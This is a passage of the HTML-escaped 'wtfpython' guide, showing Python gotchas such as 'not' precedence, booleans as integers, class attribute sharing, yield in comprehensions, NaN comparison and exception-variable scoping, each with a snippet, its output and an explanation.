&lt;code&gt;SyntaxError&lt;/code&gt;). That&#39;s why backslashes don&#39;t work at the end of a raw string.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ not knot!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 7034deb1-7443-417d-94ee-29a800524de8 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;x = True&#xA;y = False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; not x == y&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; x == not y&#xA;  File &#34;&amp;lt;input&amp;gt;&#34;, line 1&#xA;    x == not y&#xA;           ^&#xA;SyntaxError: invalid syntax&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Operator precedence affects how an expression is evaluated, and &lt;code&gt;==&lt;/code&gt; operator has higher precedence than &lt;code&gt;not&lt;/code&gt; operator in Python.&lt;/li&gt; &#xA; &lt;li&gt;So &lt;code&gt;not x == y&lt;/code&gt; is equivalent to &lt;code&gt;not (x == y)&lt;/code&gt; which is equivalent to &lt;code&gt;not (True == False)&lt;/code&gt; finally evaluating to &lt;code&gt;True&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;But &lt;code&gt;x == not y&lt;/code&gt; raises a &lt;code&gt;SyntaxError&lt;/code&gt; because it can be thought of being equivalent to &lt;code&gt;(x == not) y&lt;/code&gt; and not &lt;code&gt;x == (not y)&lt;/code&gt; which you might have expected at first sight.&lt;/li&gt; &#xA; &lt;li&gt;The parser expected the &lt;code&gt;not&lt;/code&gt; token to be a part of the &lt;code&gt;not in&lt;/code&gt; operator (because both &lt;code&gt;==&lt;/code&gt; and &lt;code&gt;not in&lt;/code&gt; operators have the same precedence), but after not being able to find an &lt;code&gt;in&lt;/code&gt; token following the &lt;code&gt;not&lt;/code&gt; token, it raises a &lt;code&gt;SyntaxError&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Half triple-quoted strings&lt;/h3&gt; &#xA;&lt;!-- Example ID: c55da3e2-1034-43b9-abeb-a7a970a2ad9e ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(&#39;wtfpython&#39;&#39;&#39;)&#xA;wtfpython&#xA;&amp;gt;&amp;gt;&amp;gt; print(&#34;wtfpython&#34;&#34;&#34;)&#xA;wtfpython&#xA;&amp;gt;&amp;gt;&amp;gt; # The following statements raise `SyntaxError`&#xA;&amp;gt;&amp;gt;&amp;gt; # print(&#39;&#39;&#39;wtfpython&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; # print(&#34;&#34;&#34;wtfpython&#34;)&#xA;  File &#34;&amp;lt;input&amp;gt;&#34;, line 3&#xA;    print(&#34;&#34;&#34;wtfpython&#34;)&#xA;                        ^&#xA;SyntaxError: EOF while scanning triple-quoted string literal&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Python supports implicit &lt;a href=&#34;https://docs.python.org/3/reference/lexical_analysis.html#string-literal-concatenation&#34;&gt;string literal concatenation&lt;/a&gt;, Example, &lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; print(&#34;wtf&#34; &#34;python&#34;)&#xA;wtfpython&#xA;&amp;gt;&amp;gt;&amp;gt; print(&#34;wtf&#34; &#34;&#34;) # or &#34;wtf&#34;&#34;&#34;&#xA;wtf&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;&#39;&#39;&#39;&lt;/code&gt; and &lt;code&gt;&#34;&#34;&#34;&lt;/code&gt; are also string delimiters in Python which causes a SyntaxError because the Python interpreter was expecting a terminating triple quote as delimiter while scanning the currently encountered triple quoted string literal.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ What&#39;s wrong with booleans?&lt;/h3&gt; &#xA;&lt;!-- Example ID: 0bba5fa7-9e6d-4cd2-8b94-952d061af5dd ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# A simple example to count the number of booleans and&#xA;# integers in an iterable of mixed data types.&#xA;mixed_list = [False, 1.0, &#34;some_string&#34;, 3, True, [], False]&#xA;integers_found_so_far = 0&#xA;booleans_found_so_far = 0&#xA;&#xA;for item in mixed_list:&#xA;    if isinstance(item, int):&#xA;        integers_found_so_far += 1&#xA;    elif isinstance(item, bool):&#xA;        booleans_found_so_far += 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; integers_found_so_far&#xA;4&#xA;&amp;gt;&amp;gt;&amp;gt; booleans_found_so_far&#xA;0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_bool = True&#xA;&amp;gt;&amp;gt;&amp;gt; &#34;wtf&#34; * some_bool&#xA;&#39;wtf&#39;&#xA;&amp;gt;&amp;gt;&amp;gt; some_bool = False&#xA;&amp;gt;&amp;gt;&amp;gt; &#34;wtf&#34; * some_bool&#xA;&#39;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def tell_truth():&#xA;    True = False&#xA;    if True == False:&#xA;        print(&#34;I have lost faith in truth!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;lt; 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; tell_truth()&#xA;I have lost faith in truth!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;bool&lt;/code&gt; is a subclass of &lt;code&gt;int&lt;/code&gt; in Python&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; issubclass(bool, int)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(int, bool)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;And thus, &lt;code&gt;True&lt;/code&gt; and &lt;code&gt;False&lt;/code&gt; are instances of &lt;code&gt;int&lt;/code&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; isinstance(True, int)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(False, int)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The integer value of &lt;code&gt;True&lt;/code&gt; is &lt;code&gt;1&lt;/code&gt; and that of &lt;code&gt;False&lt;/code&gt; is &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; int(True)&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; int(False)&#xA;0&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;See this StackOverflow &lt;a href=&#34;https://stackoverflow.com/a/8169049/4354153&#34;&gt;answer&lt;/a&gt; for the rationale behind it.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Initially, Python used to have no &lt;code&gt;bool&lt;/code&gt; type (people used 0 for false and non-zero value like 1 for true). &lt;code&gt;True&lt;/code&gt;, &lt;code&gt;False&lt;/code&gt;, and a &lt;code&gt;bool&lt;/code&gt; type was added in 2.x versions, but, for backward compatibility, &lt;code&gt;True&lt;/code&gt; and &lt;code&gt;False&lt;/code&gt; couldn&#39;t be made constants. They just were built-in variables, and it was possible to reassign them&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Python 3 was backward-incompatible, the issue was finally fixed, and thus the last snippet won&#39;t work with Python 3.x!&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Class attributes and instance attributes&lt;/h3&gt; &#xA;&lt;!-- Example ID: 6f332208-33bd-482d-8106-42863b739ed9 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class A:&#xA;    x = 1&#xA;&#xA;class B(A):&#xA;    pass&#xA;&#xA;class C(A):&#xA;    pass&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; A.x, B.x, C.x&#xA;(1, 1, 1)&#xA;&amp;gt;&amp;gt;&amp;gt; B.x = 2&#xA;&amp;gt;&amp;gt;&amp;gt; A.x, B.x, C.x&#xA;(1, 2, 1)&#xA;&amp;gt;&amp;gt;&amp;gt; A.x = 3&#xA;&amp;gt;&amp;gt;&amp;gt; A.x, B.x, C.x # C.x changed, but B.x didn&#39;t&#xA;(3, 2, 3)&#xA;&amp;gt;&amp;gt;&amp;gt; a = A()&#xA;&amp;gt;&amp;gt;&amp;gt; a.x, A.x&#xA;(3, 3)&#xA;&amp;gt;&amp;gt;&amp;gt; a.x += 1&#xA;&amp;gt;&amp;gt;&amp;gt; a.x, A.x&#xA;(4, 3)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SomeClass:&#xA;    some_var = 15&#xA;    some_list = [5]&#xA;    another_list = [5]&#xA;    def __init__(self, x):&#xA;        self.some_var = x + 1&#xA;        self.some_list = self.some_list + [x]&#xA;        self.another_list += [x]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_obj = SomeClass(420)&#xA;&amp;gt;&amp;gt;&amp;gt; some_obj.some_list&#xA;[5, 420]&#xA;&amp;gt;&amp;gt;&amp;gt; some_obj.another_list&#xA;[5, 420]&#xA;&amp;gt;&amp;gt;&amp;gt; another_obj = SomeClass(111)&#xA;&amp;gt;&amp;gt;&amp;gt; another_obj.some_list&#xA;[5, 111]&#xA;&amp;gt;&amp;gt;&amp;gt; another_obj.another_list&#xA;[5, 420, 111]&#xA;&amp;gt;&amp;gt;&amp;gt; another_obj.another_list is SomeClass.another_list&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; another_obj.another_list is some_obj.another_list&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Class variables and variables in class instances are internally handled as dictionaries of a class object. If a variable name is not found in the dictionary of the current class, the parent classes are searched for it.&lt;/li&gt; &#xA; &lt;li&gt;The &lt;code&gt;+=&lt;/code&gt; operator modifies the mutable object in-place without creating a new object. So changing the attribute of one instance affects the other instances and the class attribute as well.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ yielding None&lt;/h3&gt; &#xA;&lt;!-- Example ID: 5a40c241-2c30-40d0-8ba9-cf7e097b3b53 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_iterable = (&#39;a&#39;, &#39;b&#39;)&#xA;&#xA;def some_func(val):&#xA;    return &#34;something&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;lt;= 3.7.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; [x for x in some_iterable]&#xA;[&#39;a&#39;, &#39;b&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; [(yield x) for x in some_iterable]&#xA;&amp;lt;generator object &amp;lt;listcomp&amp;gt; at 0x7f70b0a4ad58&amp;gt;&#xA;&amp;gt;&amp;gt;&amp;gt; list([(yield x) for x in some_iterable])&#xA;[&#39;a&#39;, &#39;b&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; list((yield x) for x in some_iterable)&#xA;[&#39;a&#39;, None, &#39;b&#39;, None]&#xA;&amp;gt;&amp;gt;&amp;gt; list(some_func((yield x)) for x in some_iterable)&#xA;[&#39;a&#39;, &#39;something&#39;, &#39;b&#39;, &#39;something&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This is a bug in CPython&#39;s handling of &lt;code&gt;yield&lt;/code&gt; in generators and comprehensions.&lt;/li&gt; &#xA; &lt;li&gt;Source and explanation can be found here: &lt;a href=&#34;https://stackoverflow.com/questions/32139885/yield-in-list-comprehensions-and-generator-expressions&#34;&gt;https://stackoverflow.com/questions/32139885/yield-in-list-comprehensions-and-generator-expressions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Related bug report: &lt;a href=&#34;https://bugs.python.org/issue10544&#34;&gt;https://bugs.python.org/issue10544&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Python 3.8+ no longer allows &lt;code&gt;yield&lt;/code&gt; inside list comprehension and will throw a &lt;code&gt;SyntaxError&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Yielding from... return! *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 5626d8ef-8802-49c2-adbc-7cda5c550816 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func(x):&#xA;    if x == 3:&#xA;        return [&#34;wtf&#34;]&#xA;    else:&#xA;        yield from range(x)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;gt; 3.3):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; list(some_func(3))&#xA;[]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where did the &lt;code&gt;&#34;wtf&#34;&lt;/code&gt; go? Is it due to some special effect of &lt;code&gt;yield from&lt;/code&gt;? Let&#39;s validate that,&lt;/p&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func(x):&#xA;    if x == 3:&#xA;        return [&#34;wtf&#34;]&#xA;    else:&#xA;        for i in range(x):&#xA;          yield i&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; list(some_func(3))&#xA;[]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The same result, this didn&#39;t work either.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;From Python 3.3 onwards, it became possible to use &lt;code&gt;return&lt;/code&gt; statement with values inside generators (See &lt;a href=&#34;https://www.python.org/dev/peps/pep-0380/&#34;&gt;PEP380&lt;/a&gt;). The &lt;a href=&#34;https://www.python.org/dev/peps/pep-0380/#enhancements-to-stopiteration&#34;&gt;official docs&lt;/a&gt; say that,&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&#34;... &lt;code&gt;return expr&lt;/code&gt; in a generator causes &lt;code&gt;StopIteration(expr)&lt;/code&gt; to be raised upon exit from the generator.&#34;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In the case of &lt;code&gt;some_func(3)&lt;/code&gt;, &lt;code&gt;StopIteration&lt;/code&gt; is raised at the beginning because of &lt;code&gt;return&lt;/code&gt; statement. The &lt;code&gt;StopIteration&lt;/code&gt; exception is automatically caught inside the &lt;code&gt;list(...)&lt;/code&gt; wrapper and the &lt;code&gt;for&lt;/code&gt; loop. Therefore, the above two snippets result in an empty list.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To get &lt;code&gt;[&#34;wtf&#34;]&lt;/code&gt; from the generator &lt;code&gt;some_func&lt;/code&gt; we need to catch the &lt;code&gt;StopIteration&lt;/code&gt; exception,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;try:&#xA;    next(some_func(3))&#xA;except StopIteration as e:&#xA;    some_string = e.value&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_string&#xA;[&#34;wtf&#34;]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Nan-reflexivity *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 59bee91a-36e0-47a4-8c7d-aa89bf1d3976 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a = float(&#39;inf&#39;)&#xA;b = float(&#39;nan&#39;)&#xA;c = float(&#39;-iNf&#39;)  # These strings are case-insensitive&#xA;d = float(&#39;nan&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a&#xA;inf&#xA;&amp;gt;&amp;gt;&amp;gt; b&#xA;nan&#xA;&amp;gt;&amp;gt;&amp;gt; c&#xA;-inf&#xA;&amp;gt;&amp;gt;&amp;gt; float(&#39;some_other_string&#39;)&#xA;ValueError: could not convert string to float: some_other_string&#xA;&amp;gt;&amp;gt;&amp;gt; a == -c # inf==inf&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; None == None # None == None&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; b == d # but nan!=nan&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; 50 / a&#xA;0.0&#xA;&amp;gt;&amp;gt;&amp;gt; a / a&#xA;nan&#xA;&amp;gt;&amp;gt;&amp;gt; 23 + b&#xA;nan&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = float(&#39;nan&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; y = x / x&#xA;&amp;gt;&amp;gt;&amp;gt; y is y # identity holds&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; y == y # equality fails of y&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; [y] == [y] # but the equality succeeds for the list containing y&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;&#39;inf&#39;&lt;/code&gt; and &lt;code&gt;&#39;nan&#39;&lt;/code&gt; are special strings (case-insensitive), which, when explicitly typecast-ed to &lt;code&gt;float&lt;/code&gt; type, are used to represent mathematical &#34;infinity&#34; and &#34;not a number&#34; respectively.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Since according to IEEE standards &lt;code&gt; NaN != NaN&lt;/code&gt;, obeying this rule breaks the reflexivity assumption of a collection element in Python i.e. if &lt;code&gt;x&lt;/code&gt; is a part of a collection like &lt;code&gt;list&lt;/code&gt;, the implementations like comparison are based on the assumption that &lt;code&gt;x == x&lt;/code&gt;. Because of this assumption, the identity is compared first (since it&#39;s faster) while comparing two elements, and the values are compared only when the identities mismatch. The following snippet will make things clearer,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = float(&#39;nan&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; x == x, [x] == [x]&#xA;(False, True)&#xA;&amp;gt;&amp;gt;&amp;gt; y = float(&#39;nan&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; y == y, [y] == [y]&#xA;(False, True)&#xA;&amp;gt;&amp;gt;&amp;gt; x == y, [x] == [y]&#xA;(False, False)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Since the identities of &lt;code&gt;x&lt;/code&gt; and &lt;code&gt;y&lt;/code&gt; are different, the values are considered, which are also different; hence the comparison returns &lt;code&gt;False&lt;/code&gt; this time.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Interesting read: &lt;a href=&#34;https://bertrandmeyer.com/2010/02/06/reflexivity-and-other-pillars-of-civilization/&#34;&gt;Reflexivity, and other pillars of civilization&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Mutating the immutable!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 15a9e782-1695-43ea-817a-a9208f6bb33d ---&gt; &#xA;&lt;p&gt;This might seem trivial if you know how references work in Python.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_tuple = (&#34;A&#34;, &#34;tuple&#34;, &#34;with&#34;, &#34;values&#34;)&#xA;another_tuple = ([1, 2], [3, 4], [5, 6])&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_tuple[2] = &#34;change this&#34;&#xA;TypeError: &#39;tuple&#39; object does not support item assignment&#xA;&amp;gt;&amp;gt;&amp;gt; another_tuple[2].append(1000) #This throws no error&#xA;&amp;gt;&amp;gt;&amp;gt; another_tuple&#xA;([1, 2], [3, 4], [5, 6, 1000])&#xA;&amp;gt;&amp;gt;&amp;gt; another_tuple[2] += [99, 999]&#xA;TypeError: &#39;tuple&#39; object does not support item assignment&#xA;&amp;gt;&amp;gt;&amp;gt; another_tuple&#xA;([1, 2], [3, 4], [5, 6, 1000, 99, 999])&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;But I thought tuples were immutable...&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Quoting from &lt;a href=&#34;https://docs.python.org/3/reference/datamodel.html&#34;&gt;https://docs.python.org/3/reference/datamodel.html&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;Immutable sequences An object of an immutable sequence type cannot change once it is created. (If the object contains references to other objects, these other objects may be mutable and may be modified; however, the collection of objects directly referenced by an immutable object cannot change.)&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;+=&lt;/code&gt; operator changes the list in-place. The item assignment doesn&#39;t work, but when the exception occurs, the item has already been changed in place.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;There&#39;s also an explanation in &lt;a href=&#34;https://docs.python.org/3/faq/programming.html#why-does-a-tuple-i-item-raise-an-exception-when-the-addition-works&#34;&gt;official Python FAQ&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ The disappearing variable from outer scope&lt;/h3&gt; &#xA;&lt;!-- Example ID: 7f1e71b6-cb3e-44fb-aa47-87ef1b7decc8 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;e = 7&#xA;try:&#xA;    raise Exception()&#xA;except Exception as e:&#xA;    pass&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(e)&#xA;# prints nothing&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(e)&#xA;NameError: name &#39;e&#39; is not defined&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Source: &lt;a href=&#34;https://docs.python.org/3/reference/compound_stmts.html#except&#34;&gt;https://docs.python.org/3/reference/compound_stmts.html#except&lt;/a&gt;&lt;/p&gt; &lt;p&gt;When an exception has been assigned using &lt;code&gt;as&lt;/code&gt; target, it is cleared at the end of the &lt;code&gt;except&lt;/code&gt; clause. This is as if&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;except E as N:&#xA;    foo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;was translated into&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;except E as N:&#xA;    try:&#xA;        foo&#xA;    finally:&#xA;        del N&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;This means the exception must be assigned to a different name to be able to refer to it after the except clause. Exceptions are cleared because, with the traceback attached to them, they form a reference cycle with the stack frame, keeping all locals in that frame alive until the next garbage collection occurs.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The clauses are not scoped in Python. Everything in the example is present in the same scope, and the variable &lt;code&gt;e&lt;/code&gt; got removed due to the execution of the &lt;code&gt;except&lt;/code&gt; clause. The same is not the case with functions that have their separate inner-scopes. The example below illustrates this:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def f(x):&#xA;    del(x)&#xA;    print(x)&#xA;&#xA;x = 5&#xA;y = [5, 4, 3]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; f(x)&#xA;UnboundLocalError: local variable &#39;x&#39; referenced before assignment&#xA;&amp;gt;&amp;gt;&amp;gt; f(y)&#xA;UnboundLocalError: local variable &#39;x&#39; referenced before assignment&#xA;&amp;gt;&amp;gt;&amp;gt; x&#xA;5&#xA;&amp;gt;&amp;gt;&amp;gt; y&#xA;[5, 4, 3]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In Python 2.x, the variable name &lt;code&gt;e&lt;/code&gt; gets assigned to &lt;code&gt;Exception()&lt;/code&gt; instance, so when you try to print, it prints nothing.&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; e&#xA;Exception()&#xA;&amp;gt;&amp;gt;&amp;gt; print e&#xA;# Nothing is printed!&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ The mysterious key type conversion&lt;/h3&gt; &#xA;&lt;!-- Example ID: 00f42dd0-b9ef-408d-9e39-1bc209ce3f36 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SomeClass(str):&#xA;    pass&#xA;&#xA;some_dict = {&#39;s&#39;: 42}&#xA;&lt;/code&gt;&lt;/pre&gt; 